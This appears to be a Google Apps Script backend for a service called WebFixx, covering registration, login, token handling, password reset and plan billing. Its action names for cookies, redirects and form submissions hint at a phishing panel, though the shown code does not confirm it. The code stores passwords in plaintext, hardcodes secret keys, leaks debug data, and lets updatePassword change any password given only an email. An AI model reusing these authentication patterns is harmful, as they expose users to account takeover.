// Main endpoint handler
const SCRIPT_KEY = '1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234';

const CONFIG = {
  NAME: "WebFixx",
  DB_ID: "17cjaHx93z3ciGAdgJ4AvkjgIwI9gP3RsfJU5G7exp-U",
  SHEET_NAME: {
    PROJECTS: "projects",
    HUB: "hub",
    SETTINGS: "settings",
    COOKIE: "cookie", // Added COOKIE sheet name
  },
  FOLDER_ID: {
    PROFILE_PICTURE: "1TwKBloBke5GQav9h5knkO0lk7ezo-PR8",
  },
  CACHE_EXPIRED_IN_SECONDS: 21600, // 6 hours
  EXTERNAL_API: "https://jshx9c6n-3001.uks1.devtunnels.ms/"
};


function validateRequest(params) {
  const providedKey = params.key || params.headers?.['X-Script-Key'];
  if (!providedKey || providedKey !== SCRIPT_KEY) {
    throw new Error('Unauthorized request');
  }
  return true;
}

function doPost(e) {
  try {
    Logger.log("Received POST request");
    const params = e.parameter;
    
    // Validate request
    try {
      validateRequest(params);
    } catch (error) {
      return createJsonResponse({ error: 'Unauthorized', status: 401 });
    }

    const action = params.action;
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const userSheet = ss.getSheetByName("user");

    if (!userSheet) {
      return createJsonResponse({ error: "Required database not found" });
    }

    // Remove security key from params before processing
    delete params.key;

    switch (action) {
      case "verifyRedirectVisit":
        return verifyRedirectVisit(params);
      case "verifyPageVisit":
        return verifyPageVisit(params);
      case "getCookieData":
        return getCookieData(params);
      case "setCookieData":
        return setCookieData(params);
      case "notifyFormSubmission":
        return notifyFormSubmission(params);
      case "poolingOperator":
        return poolingOperator(params);
      case "login":
        return handleLogin(params);
      case "register":
        return handleRegister(params);
      case "resetPassword":
        return resetPassword(params);
      case "verifyResetCode":
        return verifyResetCode(params);
      case "updatePassword":
        return updatePassword(params);
      case "backendFunction":
        return handleBackendFunction(params);
      default:
        return createJsonResponse({ error: "Invalid action" });
    }
  } catch (error) {
    Logger.log("Error in doPost: " + error.message);
    return createJsonResponse({ error: error.message });
  }
}

// Add this at the top of your file
const SECRET_KEY = "fd7c25e9b4a3f8d6c1e0b2a5984f3d2e1b7a9c4f0e8d2b5a3c6f9e1d4b7a0c8e5f2d9b6a3c0f7e4d1b8a5c2f9e6d3b0a7c4f1e8d5b2a9c6f3e0d7b4a1c8f5e2";

function generateSecureToken(userId, role) {
  const timestamp = new Date().getTime();
  const randomPart = Math.random().toString(36).substring(2);
  const dataToEncode = `${userId}|${role}|${timestamp}|${randomPart}`;
  
  // Create HMAC signature
  const signature = Utilities.computeHmacSha256Signature(
    dataToEncode,
    SECRET_KEY
  );
  const signatureHex = signature.map(byte => 
    ('0' + (byte & 0xFF).toString(16)).slice(-2)
  ).join('');
  
  // Combine data and signature
  const token = `${dataToEncode}.${signatureHex}`;
  return Utilities.base64Encode(token);
}


function createDetailedError(message, details = {}) {
  return {
    error: message,
    details: {
      ...details,
      timestamp: new Date().toISOString()
    }
  };
}

function verifyToken(token) {
  try {
    // Early validation
    if (!token) {
      Logger.log("No token provided");
      return {
        success: false,
        error: "No token provided"
      };
    }

    Logger.log("Starting token verification for token length: " + token.length);

    // Decode base64 token with more robust error handling
    let decoded;
    try {
      decoded = Utilities.base64Decode(token);
      if (!decoded || decoded.length === 0) {
        throw new Error("Base64 decoding resulted in empty data");
      }
      decoded = Utilities.newBlob(decoded).getDataAsString();
      Logger.log("Successfully decoded token: " + decoded.substring(0, 50) + "...");
    } catch (e) {
      Logger.log("Token decoding error: " + e.message);
      return {
        success: false,
        error: "Token decoding failed",
        debug: {
          message: e.message,
          tokenStart: token.substring(0, 20) + "..."
        }
      };
    }

    // Split token into data and signature
    const [data, receivedSignature] = decoded.split('.');
    if (!data || !receivedSignature) {
      Logger.log("Invalid token format");
      return {
        success: false,
        error: "Invalid token format",
        debug: { 
          decodedToken: decoded,
          dataLength: data ? data.length : 'undefined',
          signatureLength: receivedSignature ? receivedSignature.length : 'undefined'
        }
      };
    }

    // Parse token data
    const tokenParts = data.split('|');
    if (tokenParts.length !== 4) {
      Logger.log("Incorrect number of token parts: " + tokenParts.length);
      return {
        success: false,
        error: "Malformed token data",
        debug: { 
          tokenParts: tokenParts,
          expectedParts: 4
        }
      };
    }

    const [userId, role, timestamp, randomPart] = tokenParts;
    Logger.log("Token parts extracted: " + JSON.stringify({ userId, role, timestamp }));

    // Validate critical token parts
    if (!userId || !role) {
      Logger.log("Missing critical token information");
      return {
        success: false,
        error: "Incomplete token data",
        debug: { userId, role }
      };
    }

    // Get sheet and validate it exists
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      Logger.log("User sheet not found");
      return {
        success: false,
        error: "User sheet not found"
      };
    }

    // Get all data at once to minimize API calls
    const dataRange = userSheet.getDataRange();
    const values = dataRange.getValues();
    const headers = values[0];

    // Find column indices with more robust checking
    const requiredColumns = ["userId", "tokens", "role"];
    const columnIndices = requiredColumns.map(col => {
      const index = headers.indexOf(col);
      if (index === -1) {
        Logger.log("Missing column: " + col);
      }
      return index;
    });

    if (columnIndices.some(index => index === -1)) {
      return {
        success: false,
        error: "Required columns not found",
        debug: { 
          availableColumns: headers,
          requiredColumns: requiredColumns
        }
      };
    }

    const [userIdColIndex, tokensColIndex, roleColIndex] = columnIndices;

    // Find user row
    const userRowIndex = values.findIndex(row => row[userIdColIndex] === userId);
    if (userRowIndex === -1) {
      Logger.log("User not found for userId: " + userId);
      return {
        success: false,
        error: "User not found",
        debug: { 
          searchedUserId: userId,
          totalUsers: values.length - 1 // subtract header row
        }
      };
    }

    // Parse tokens with enhanced error handling
    let tokens;
    try {
      const tokensValue = values[userRowIndex][tokensColIndex];
      tokens = JSON.parse(tokensValue || "[]");
      
      if (!Array.isArray(tokens)) {
        throw new Error("Tokens is not an array");
      }
    } catch (e) {
      Logger.log("Token parsing error: " + e.message);
      return {
        success: false,
        error: "Failed to parse tokens",
        debug: {
          rawTokens: values[userRowIndex][tokensColIndex],
          parseError: e.message
        }
      };
    }

    // Validate token exists and not expired
    const tokenData = tokens.find(t => t.token === token);
    if (!tokenData) {
      Logger.log("Token not found in user tokens");
      return {
        success: false,
        error: "Token not found in user tokens",
        debug: { 
          userId, 
          tokenCount: tokens.length,
          tokenFragments: tokens.map(t => t.token.substring(0, 10))
        }
      };
    }

    // Check expiration
    const now = new Date();
    const expiresAt = new Date(tokenData.expiresAt);
    if (expiresAt < now) {
      Logger.log("Token expired");
      return {
        success: false,
        error: "Token expired",
        debug: {
          expiresAt: expiresAt.toISOString(),
          currentTime: now.toISOString()
        }
      };
    }

    // Update last used time
    tokenData.lastUsed = now.toISOString();
    
    // Update tokens in sheet
    try {
      const tokenCell = userSheet.getRange(userRowIndex + 1, tokensColIndex + 1);
      tokenCell.setValue(JSON.stringify(tokens));
    } catch (updateError) {
      Logger.log("Error updating token last used time: " + updateError.message);
      // Non-critical error, continue with verification
    }

    Logger.log("Token verification successful for userId: " + userId);
    return {
      success: true,
      userId: userId,
      role: role,
      decodedData: {
        userId: userId,
        role: role,
        timestamp: timestamp,
        randomPart: randomPart,
        fullToken: token,
        decodedToken: decoded,
        originalSignature: receivedSignature
      }
    };

  } catch (error) {
    Logger.log("Comprehensive verification error: " + error.toString());
    return {
      success: false,
      error: "Verification process failed",
      debug: {
        errorMessage: error.message,
        errorStack: error.stack,
        timestamp: new Date().toISOString()
      }
    };
  }
}

/**
 * Store token data in user's token column
 */
function storeUserToken(userId, tokenData) {
  try {
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    const userRow = getRowsByColumn("user", "userId", userId);
    
    if (!userRow.success || userRow.count === 0) {
      throw new Error("User not found");
    }

    const headers = userRow.headers;
    const tokenColumnIndex = headers.indexOf("tokens");
    
    if (tokenColumnIndex === -1) {
      throw new Error("Tokens column not found");
    }

    // Get existing tokens
    let tokens = [];
    const existingTokens = userRow.data[0][tokenColumnIndex];
    if (existingTokens) {
      try {
        tokens = JSON.parse(existingTokens);
        // Clean expired tokens
        tokens = tokens.filter(t => new Date(t.expiresAt) > new Date());
      } catch (e) {
        tokens = [];
      }
    }

    // Add new token
    tokens.push({
      token: tokenData.token,
      createdAt: new Date(),
      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), // 30 days
      deviceInfo: tokenData.deviceInfo || {},
      lastUsed: new Date()
    });

    // Update tokens in sheet
    const tokenCell = userSheet.getRange(userRow.rowIndex, tokenColumnIndex + 1);
    tokenCell.setValue(JSON.stringify(tokens));

    return { success: true };
  } catch (error) {
    Logger.log("Error storing token:", error);
    return { success: false, error: error.message };
  }
}

function testHandleRegister() {
  Logger.log("--- Starting testHandleRegister ---");

  // Test Case: Successful Registration
  const successParams = {
    email: `testuser_${Date.now()}@example.com`, // Unique email for each test run
    password: "Password123",
    username: `testuser${Date.now()}`,
    referralCode: "REF123"
  };
  let result = handleRegister(successParams);
  Logger.log("Registration Result: " + JSON.stringify(result, null, 2));

  if (result.success) {
    Logger.log("Successfully registered and logged in user.");
  } else {
    Logger.log("Registration failed: " + result.error);
  }

  Logger.log("--- Finished testHandleRegister ---");
}

function handleRegister(params) {
  const { email, password, username, referralCode } = params;

  try {
    // 1. Validate input data using the existing helper function
    const validationError = validateRegistrationData(email, password, username);
    if (validationError) {
      return createJsonResponse({ success: false, error: validationError });
    }

    // Get user sheet
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      throw new Error("User sheet not found");
    }
    const headers = userSheet.getRange(1, 1, 1, userSheet.getLastColumn()).getValues()[0];
    const emailIndex = headers.indexOf("email");

    // 2. Check for existing email to prevent duplicate registrations
    const existingUser = getRowsByColumn("user", "email", email);
    if (existingUser.success && existingUser.count > 0) {
      return createJsonResponse({ success: false, error: "Email already registered" });
    }

    // Check if the email is a "destroyed" email
    if (email.startsWith("destroyed") && email.endsWith("@webfixx.com")) {
      return createJsonResponse({ success: false, error: "Cannot register with this email" });
    }

    // Create new user without userId first
    const newUser = {
      email: email,
      password: password, // Consider hashing password before storing
      username: username,
      createdAt: new Date().toISOString(),
      role: "USER",
      plan: "FREE",
      planExpiry: "",
      referredBy: referralCode || "",
      verifyStatus: "FALSE",
      darkMode: "FALSE",
      loginCount: "0",
      lastLogin: "",
      ipData: JSON.stringify(params.ipData || {}), // Store ipData
      deviceInfo: JSON.stringify(params.deviceInfo || {}), // Store deviceInfo
      twoFactorAuth: "FALSE", // Default 2FA to FALSE
      apiKey: "", // Default empty API key
      destroyAccount: "FALSE", // Default destroyAccount to FALSE
    };

    // Add user to sheet
    const result = setRowDataByHeaderMap("user", newUser);
    if (!result.success) {
      throw new Error(result.error || "Failed to create user record");
    }

    // Flush changes to the spreadsheet before attempting to read the new row
    SpreadsheetApp.flush();

    // Wait 2 seconds to ensure row is properly added and flushed
    Utilities.sleep(2000);

    // Get the user's row by email using the helper method
    const userRowResult = getRowsByColumn("user", "email", email);
    if (!userRowResult.success || userRowResult.count === 0) {
      throw new Error("Failed to retrieve user data after creation using getRowsByColumn");
    }

    const userFoundData = userRowResult.data[0]; // This is the 0-based array of the user's data
    const userFoundHeaders = userRowResult.headers; // Headers from getRowsByColumn

    // To get the 1-based row index for getRange, we need to re-fetch all rows and find the index
    const allSheetData = userSheet.getDataRange().getValues();
    const allSheetHeaders = allSheetData[0];

    const emailColIndexInFullSheet = allSheetHeaders.indexOf("email");

    if (emailColIndexInFullSheet === -1) {
      throw new Error("Email column not found in user sheet for index lookup");
    }

    // Find the 0-based index of the user's row in the full sheet data
    const userActualRowIndex0Based = allSheetData.findIndex((row, index) =>
      index > 0 && row[emailColIndexInFullSheet] === email
    );

    if (userActualRowIndex0Based === -1) {
      throw new Error("Failed to locate new user's row index in the sheet");
    }

    const userActualRowIndex1Based = userActualRowIndex0Based + 1; // Convert to 1-based for getRange

    // Get userId and role from the found row data (from the full sheet data)
    const userIdIndexInFullSheet = allSheetHeaders.indexOf("userId");
    if (userIdIndexInFullSheet === -1) {
      throw new Error("userId column not found in full sheet data");
    }
    const userId = allSheetData[userActualRowIndex0Based][userIdIndexInFullSheet];
    const role = allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("role")];

    // Generate token
    const token = generateSecureToken(userId, role);

    // Create token data
    const tokenData = {
      token: token,
      createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(), // 30 days expiration
      deviceInfo: {}, // No device info on registration, can be added later
      lastUsed: new Date().toISOString()
    };

    // Handle tokens: Add new token to the user's row
    // Use allSheetHeaders to get the correct tokensIndex for the sheet
    const tokensIndex = allSheetHeaders.indexOf("tokens");
    let tokens = [];

    if (tokensIndex !== -1) {
      try {
        // Use the data from the actual row in the sheet for parsing tokens
        tokens = JSON.parse(allSheetData[userActualRowIndex0Based][tokensIndex] || "[]");
        tokens = tokens.filter(t => new Date(t.expiresAt) > new Date()); // Clean expired tokens
      } catch (e) {
        tokens = [];
      }
    } else {
      // Tokens column not found, assuming setRowDataByHeaderMap handles new columns.
    }

    tokens.push(tokenData);

    // Update tokens in sheet using the 1-based row index
    userSheet.getRange(userActualRowIndex1Based, tokensIndex + 1).setValue(JSON.stringify(tokens));

    // Get additional data based on role
    const allData = role === "ADMIN" ? getAdminData(userId) : getUserData(userId);

    // Format user response
    const userData = {
      id: userId,
      userId: userId,
      email: email,
      username: username,
      role: role,
      plan: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("plan")] || "FREE",
      verifyStatus: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("verifyStatus")] || "FALSE",
      balance: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("balance")] || "0.00",
      pendingBalance: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("pendingBalance")] || "0.00",
      btcAddress: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("btcAddress")] || "",
      ethAddress: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("ethAddress")] || "",
      usdtAddress: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("usdtAddress")] || "",
      darkMode: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("darkMode")] || "FALSE", // Ensure darkMode is included
    };

    // Send verification email after successful registration
    sendVerificationEmail({ userEmail: email });

    return createJsonResponse({
      success: true,
      token: token,
      user: userData,
      data: allData,
      needsVerification: userData.verifyStatus === "FALSE" || !userData.verifyStatus
    });

  } catch (error) {
    return createJsonResponse({
      success: false, // Explicitly set success to false for errors
      error: `Registration failed: ${error.message}`
    });
  }
}

function validateRegistrationData(email, password, username) {
  // Email validation
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!email || !emailRegex.test(email)) {
    return "Invalid email format";
  }

  // Password validation
  if (!password || password.length < 6) {
    return "Password must be at least 6 characters";
  }
  
  if (!/[A-Z]/.test(password)) {
    return "Password must contain at least one uppercase letter";
  }
  
  if (!/[0-9]/.test(password)) {
    return "Password must contain at least one number";
  }

  // Username validation
  if (!username || username.length < 3) {
    return "Username must be at least 3 characters";
  }
  
  if (!/^[a-zA-Z][a-zA-Z0-9_]*$/.test(username)) {
    return "Username must start with a letter and contain only letters, numbers, and underscores";
  }

  return null;
}

function handleLogin(params) {
  try {
    const { email, password, ipData, deviceInfo } = params; // Added ipData

    // Input validation
    if (!email || !password) {
      return createJsonResponse({ error: "Email and password are required" });
    }

    // Get user data with row index
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    const headers = userSheet.getRange(1, 1, 1, userSheet.getLastColumn()).getValues()[0];
    const rows = userSheet.getDataRange().getValues();

    // Find user row
    const emailIndex = headers.indexOf("email");
    const userRowIndex = rows.findIndex((row, index) => index > 0 && row[emailIndex] === email);

    if (userRowIndex === -1) {
      return createJsonResponse({ error: "Invalid credentials" });
    }

    const user = rows[userRowIndex];
    const passwordIndex = headers.indexOf("password");
    const destroyAccountIndex = headers.indexOf("destroyAccount");
    const twoFactorAuthIndex = headers.indexOf("twoFactorAuth");
    const storedIpDataIndex = headers.indexOf("ipData");
    const storedDeviceInfoIndex = headers.indexOf("deviceInfo");
    const verifyStatusIndex = headers.indexOf("verifyStatus");
    const verifyCodeIndex = headers.indexOf("verifyCode");

    // Check if account is destroyed
    if (destroyAccountIndex !== -1 && user[destroyAccountIndex] === "TRUE") {
      return createJsonResponse({ success: false, error: "This account has been destroyed" });
    }

    // Verify password
    if (user[passwordIndex] !== password) {
      return createJsonResponse({ error: "Invalid credentials" });
    }

    const userId = user[headers.indexOf("userId")];
    const role = user[headers.indexOf("role")];

    // Store current ipData and deviceInfo
    const updateFields = {
      ipData: JSON.stringify(ipData || {}),
      deviceInfo: JSON.stringify(deviceInfo || {}),
    };

    // 2FA Logic
    if (twoFactorAuthIndex !== -1 && user[twoFactorAuthIndex] === "TRUE") {
      const storedIpData = storedIpDataIndex !== -1 ? JSON.parse(user[storedIpDataIndex] || "{}") : {};
      const storedDeviceInfo = storedDeviceInfoIndex !== -1 ? JSON.parse(user[storedDeviceInfoIndex] || "{}") : {};

      const isIpDataMatch = JSON.stringify(ipData || {}) === JSON.stringify(storedIpData);
      const isDeviceInfoMatch = JSON.stringify(deviceInfo || {}) === JSON.stringify(storedDeviceInfo);

      if (!isIpDataMatch || !isDeviceInfoMatch) {
        // If device/IP doesn't match, set verifyStatus to FALSE and send verification email
        const newVerifyCode = Math.random().toString(36).substring(2, 8).toUpperCase();
        updateFields.verifyStatus = "FALSE";
        updateFields.verifyCode = newVerifyCode;

        // Update user data in sheet immediately
        setMultipleCellDataByColumnSearch("user", "userId", userId, updateFields);

        // Send verification email
        sendVerificationEmail({ userEmail: email, verificationCode: newVerifyCode }); // Assuming sendVerificationEmail can take a code

        // Do not return here, continue with token generation and other steps
        // The needsVerification flag will be set in the final response
      }
    }

    // Update ipData and deviceInfo in the sheet
    // This will also update verifyStatus and verifyCode if 2FA mismatch occurred
    setMultipleCellDataByColumnSearch("user", "userId", userId, updateFields);

    // Generate token
    const token = generateSecureToken(userId, role);

    // Create token data
    const tokenData = {
      token: token,
      createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
      deviceInfo: deviceInfo || {},
      lastUsed: new Date().toISOString()
    };

    // Handle tokens
    const tokensIndex = headers.indexOf("tokens");
    let tokens = [];

    if (tokensIndex === -1) {
      // Add tokens column if it doesn't exist
      headers.push("tokens");
      userSheet.getRange(1, headers.length).setValue("tokens");
      tokensIndex = headers.length - 1;
    } else {
      try {
        tokens = JSON.parse(user[tokensIndex] || "[]");
        // Clean expired tokens
        tokens = tokens.filter(t => new Date(t.expiresAt) > new Date());
      } catch (e) {
        Logger.log("Error parsing tokens:", e);
      }
    }

    // Add new token
    tokens.push(tokenData);

    // Update tokens in sheet
    userSheet.getRange(userRowIndex + 1, tokensIndex + 1).setValue(JSON.stringify(tokens));

    // Get additional data
    const allData = role === "ADMIN" ? getAdminData(userId) : getUserData(userId);

    // Format user response
    const userData = {
      id: userId,
      userId: userId,
      email: user[emailIndex],
      username: user[headers.indexOf("username")],
      role: role,
      plan: user[headers.indexOf("plan")] || "FREE",
      planExpiry: user[headers.indexOf("planExpiry")] || "",
      verifyStatus: user[verifyStatusIndex] || "FALSE", // Use updated verifyStatus
      balance: user[headers.indexOf("balance")] || "0.00",
      pendingBalance: user[headers.indexOf("pendingBalance")] || "0.00",
      btcAddress: user[headers.indexOf("btcAddress")] || "",
      ethAddress: user[headers.indexOf("ethAddress")] || "",
      usdtAddress: user[headers.indexOf("usdtAddress")] || "",
      darkMode: user[headers.indexOf("darkMode")] || "FALSE",
      twoFactorAuth: user[twoFactorAuthIndex] || "FALSE", // Include 2FA status
    };

    return createJsonResponse({
      success: true,
      token: token,
      user: userData,
      data: allData,
      needsVerification: userData.verifyStatus === "FALSE" || !userData.verifyStatus
    });

  } catch (error) {
    return createJsonResponse({ 
      success: false, 
      error: error.message || "Login failed" 
    });
  }
}

function resetPassword(params) {
  try {
    Logger.log("Starting password reset with params:", params);
    const { email } = params;
    
    if (!email) {
      return createJsonResponse({
        success: false,
        error: "Email is required"
      });
    }

    // Get user sheet and validate
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      return createJsonResponse({
        success: false,
        error: "User sheet not found"
      });
    }

    // Get data and validate columns
    const data = userSheet.getDataRange().getValues();
    const headers = data[0];
    const emailColIndex = headers.indexOf("email");
    const tempCodeColIndex = headers.indexOf("tempCode");
    const usernameColIndex = headers.indexOf("username");

    if (emailColIndex === -1 || tempCodeColIndex === -1 || usernameColIndex === -1) {
      return createJsonResponse({
        success: false,
        error: "Required columns not found",
        debug: { headers, required: ["email", "tempCode", "username"] }
      });
    }

    // Find user
    const userRowIndex = data.findIndex(row => row[emailColIndex] === email);
    if (userRowIndex === -1) {
      return createJsonResponse({
        success: false,
        error: "No account found with this email"
      });
    }

    // Generate and save code
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    try {
      userSheet.getRange(userRowIndex + 1, tempCodeColIndex + 1).setValue(code);
    } catch (e) {
      return createJsonResponse({
        success: false,
        error: "Failed to save verification code",
        debug: { 
          rowIndex: userRowIndex + 1,
          colIndex: tempCodeColIndex + 1,
          error: e.message
        }
      });
    }

    // Send email
    try {
      const username = data[userRowIndex][usernameColIndex];
      GmailApp.sendEmail(
        email,
        "Reset Your WebFixx Password",
        `Your password reset code is: ${code}`,
        {
          name: "WebFixx Support",
          htmlBody: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
              <h2 style="color: #2563eb; margin-bottom: 20px;">Reset Your Password</h2>
              <p>Hi ${username},</p>
              <p>We received a request to reset your WebFixx account password.</p>
              <p>Your verification code is:</p>
              <div style="background-color: #f3f4f6; padding: 20px; text-align: center; font-size: 24px; letter-spacing: 5px; margin: 20px 0; border-radius: 8px;">
                ${code}
              </div>
              <p>This code will expire in 5 minutes.</p>
              <p style="color: #6b7280; font-size: 14px; margin-top: 30px;">
                If you didn't request this reset, please ignore this email or contact support.
              </p>
            </div>
          `
        }
      );

      return createJsonResponse({
        success: true,
        message: "Reset code sent successfully"
      });

    } catch (e) {
      return createJsonResponse({
        success: false,
        error: "Failed to send email",
        debug: { error: e.message }
      });
    }

  } catch (error) {
    Logger.log("Reset password error:", error);
    return createJsonResponse({
      success: false,
      error: "Password reset failed",
      debug: {
        errorMessage: error.message,
        stack: error.stack
      }
    });
  }
}

function verifyResetCode(params) {
  try {
    Logger.log("Verifying reset code with params:", params);
    const { email, code } = params;
    
    if (!email || !code) {
      return createJsonResponse({
        success: false,
        error: "Email and verification code are required"
      });
    }

    // Get user data
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      return createJsonResponse({
        success: false,
        error: "System error: User sheet not found"
      });
    }

    const data = userSheet.getDataRange().getDisplayValues();
    const headers = data[0];
    const emailColIndex = headers.indexOf("email");
    const tempCodeColIndex = headers.indexOf("tempCode");

    if (emailColIndex === -1 || tempCodeColIndex === -1) {
      return createJsonResponse({
        success: false,
        error: "System error: Required columns not found"
      });
    }

    // Find user
    const userRowIndex = data.findIndex(row => row[emailColIndex] === email);
    if (userRowIndex === -1) {
      return createJsonResponse({
        success: false,
        error: "Invalid email or verification code"
      });
    }

    const storedCode = data[userRowIndex][tempCodeColIndex];
    
    if (!storedCode || code !== storedCode) {
      return createJsonResponse({
        success: false,
        error: "Invalid or expired verification code"
      });
    }

    return createJsonResponse({
      success: true,
      message: "Code verified successfully"
    });

  } catch (error) {
    Logger.log("Verification error:", error);
    return createJsonResponse({
      success: false,
      error: "Code verification failed"
    });
  }
}

function updatePassword(params) {
  try {
    Logger.log("Updating password with params:", params);
    const { email, newPassword } = params;
    
    if (!email || !newPassword) {
      return createJsonResponse({
        success: false,
        error: "Email and new password are required"
      });
    }

    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      return createJsonResponse({
        success: false,
        error: "System error: User sheet not found"
      });
    }

    const data = userSheet.getDataRange().getValues();
    const headers = data[0];
    const emailColIndex = headers.indexOf("email");
    const passwordColIndex = headers.indexOf("password");

    if (emailColIndex === -1 || passwordColIndex === -1) {
      return createJsonResponse({
        success: false,
        error: "System error: Required columns not found"
      });
    }

    const userRowIndex = data.findIndex(row => row[emailColIndex] === email);
    if (userRowIndex === -1) {
      return createJsonResponse({
        success: false,
        error: "User not found"
      });
    }

    try {
      userSheet.getRange(userRowIndex + 1, passwordColIndex + 1).setValue(newPassword);

      return createJsonResponse({
        success: true,
        message: "Password updated successfully"
      });

    } catch (e) {
      Logger.log("Error updating password:", e);
      return createJsonResponse({
        success: false,
        error: "Failed to update password"
      });
    }

  } catch (error) {
    Logger.log("Password update error:", error);
    return createJsonResponse({
      success: false,
      error: "Password update failed"
    });
  }
}

function changePassword(params) {
  try {
    Logger.log("Starting changePassword with params:", params);
    const { userId, oldPassword, newPassword } = params;

    if (!userId || !oldPassword || !newPassword) {
      return {
        success: false,
        error: "Missing required fields: userId, oldPassword, and newPassword are required"
      };
    }

    // Get user data
    const userResult = getRowsByColumn("user", "userId", userId);
    if (!userResult.success || userResult.count === 0) {
      return {
        success: false,
        error: "User not found",
        details: userResult
      };
    }

    const userRow = userResult.data[0];
    const headers = userResult.headers;
    const passwordIndex = headers.indexOf("password");

    if (passwordIndex === -1) {
      return {
        success: false,
        error: "System error: Password column not found"
      };
    }

    // Verify old password
    if (userRow[passwordIndex] !== oldPassword) {
      return {
        success: false,
        error: "Invalid old password."
      };
    }

    // Validate new password (re-using existing validation logic or adding new)
    // Assuming validateRegistrationData can be used for password strength check
    const validationError = validateRegistrationData(userRow[headers.indexOf("email")], newPassword, userRow[headers.indexOf("username")]);
    if (validationError) {
      return { success: false, error: validationError };
    }

    // Update password
    const updateResult = setMultipleCellDataByColumnSearch("user", "userId", userId, {
      password: newPassword
    });

    if (!updateResult.success) {
      return {
        success: false,
        error: "Failed to update password",
        details: updateResult
      };
    }

    return {
      success: true,
      message: "Password changed successfully."
    };

  } catch (error) {
    Logger.log("Error in changePassword:", error.message);
    return {
      success: false,
      error: "Server error: " + error.message,
      details: {
        stack: error.stack
      }
    };
  }
}

function generateApiKey(params) {
  try {
    Logger.log("Starting generateApiKey with params:", params);
    const { userId } = params;

    if (!userId) {
      return {
        success: false,
        error: "Missing required field: userId is required"
      };
    }

    // Get user data
    const userResult = getRowsByColumn("user", "userId", userId);
    if (!userResult.success || userResult.count === 0) {
      return {
        success: false,
        error: "User not found",
        details: userResult
      };
    }

    // Generate a new API key
    const newApiKey = Utilities.getUuid().replace(/-/g, ''); // Generate a UUID and remove hyphens

    // Update user's API key
    const updateResult = setMultipleCellDataByColumnSearch("user", "userId", userId, {
      apiKey: newApiKey
    });

    if (!updateResult.success) {
      return {
        success: false,
        error: "Failed to generate API Key.",
        details: updateResult
      };
    }

    return {
      success: true,
      message: "New API Key generated successfully.",
      data: {
        apiKey: newApiKey
      }
    };

  } catch (error) {
    Logger.log("Error in generateApiKey:", error.message);
    return {
      success: false,
      error: "Server error: " + error.message,
      details: {
        stack: error.stack
      }
    };
  }
}

function changePlan(params) {
  try {
    Logger.log("Starting changePlan with params:", params);
    const { userId, newPlan } = params;

    if (!userId || !newPlan) {
      return {
        success: false,
        error: "Missing required fields: userId and newPlan are required"
      };
    }

    // Get user data
    const userResult = getRowsByColumn("user", "userId", userId);
    if (!userResult.success || userResult.count === 0) {
      return {
        success: false,
        error: "User not found",
        details: userResult
      };
    }

    const userRow = userResult.data[0];
    const userHeaders = userResult.headers;
    const currentPlan = userRow[userHeaders.indexOf("plan")];

    if (currentPlan === newPlan) {
      return {
        success: false,
        error: `User is already on plan: ${newPlan}`
      };
    }

    // Get plan details from 'limits' sheet, converting newPlan to uppercase for case-insensitive matching
    const limitsResult = getRowsByColumn("limits", "plan", newPlan.toUpperCase());
    if (!limitsResult.success || limitsResult.count === 0) {
      return {
        success: false,
        error: `Invalid plan: ${newPlan} not found in limits.`,
        details: {
          searchedPlan: newPlan.toUpperCase(),
          limitsSheetHeaders: limitsResult.headers || "N/A",
          limitsSheetData: limitsResult.data || "N/A"
        }
      };
    }

    const planRow = limitsResult.data[0];
    const planHeaders = limitsResult.headers;
    const priceIndex = planHeaders.indexOf("price");
    const currencyIndex = planHeaders.indexOf("currency");

    const planPrice = priceIndex !== -1 ? parseFloat(planRow[priceIndex]) : 0;
    const planCurrency = currencyIndex !== -1 ? planRow[currencyIndex] : "USD"; // Default currency

    if (planPrice <= 0) {
      return {
        success: false,
        error: `Invalid price for plan ${newPlan}.`
      };
    }

    // Debit the user for the new plan
    const debitResult = debit({
      userId,
      amount: planPrice.toFixed(2),
      purpose: `upgrade_plan_to_${newPlan}`
    });

    if (!debitResult.success) {
      if (debitResult.details && debitResult.details.message && debitResult.details.message.includes("Insufficient balance")) {
        return {
          success: false,
          error: "Plan change failed: Insufficient funds.",
          details: debitResult.details
        };
      }
      return {
        success: false,
        error: "Failed to process payment for plan upgrade: " + (debitResult.error || "Failed to process transaction."),
        details: debitResult.details || {}
      };
    }

    // Calculate plan expiry date (365 days from now)
    const planExpiryDate = new Date();
    planExpiryDate.setDate(planExpiryDate.getDate() + 365);

    // Update user's plan and planExpiry
    const updateResult = setMultipleCellDataByColumnSearch("user", "userId", userId, {
      plan: newPlan,
      planExpiry: planExpiryDate.toISOString() // Store as ISO string including date and time
    });

    if (!updateResult.success) {
      return {
        success: false,
        error: "Failed to update user plan",
        details: updateResult
      };
    }

    // Get updated user balance
    const updatedUserResult = getRowsByColumn("user", "userId", userId);
